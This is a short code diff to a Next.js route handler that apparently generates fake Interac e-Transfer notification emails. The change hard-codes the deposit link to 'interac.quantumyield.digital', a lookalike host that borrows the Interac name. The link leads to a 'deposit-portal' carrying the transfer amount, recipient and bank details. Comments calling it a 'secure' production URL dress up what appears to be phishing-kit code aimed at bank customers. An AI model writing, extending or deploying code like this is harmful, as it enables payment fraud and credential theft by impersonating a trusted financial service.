@@ -26,7 +26,19 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: "Invalid amount format" }, { status: 400 })
     }
 
-    const depositUrl = `${process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000"}/deposit-portal?transferId=${transferId}&amount=${amount}&recipient=${recipient}&recipientName=${encodeURIComponent(recipientName || "")}&bankName=${encodeURIComponent(bankName || "Banking System")}&message=${encodeURIComponent(message || "")}&timestamp=${timestamp}`
+    // Generate secure deposit URL with all required parameters
+    // Using the production domain for deposit portal
+    const depositBaseUrl = "https://interac.quantumyield.digital"
+    const depositParams = new URLSearchParams({
+      transferId,
+      amount: amountNumber.toString(),
+      recipient,
+      recipientName: recipientName || "",
+      bankName: bankName || "Banking System",
+      message: message || "",
+      timestamp: timestamp?.toString() || Date.now().toString(),
+    })
+    const depositUrl = `${depositBaseUrl}/deposit-portal?${depositParams.toString()}`
 
     const html = generateInteracEmailHtml({
       amount: amountNumber,
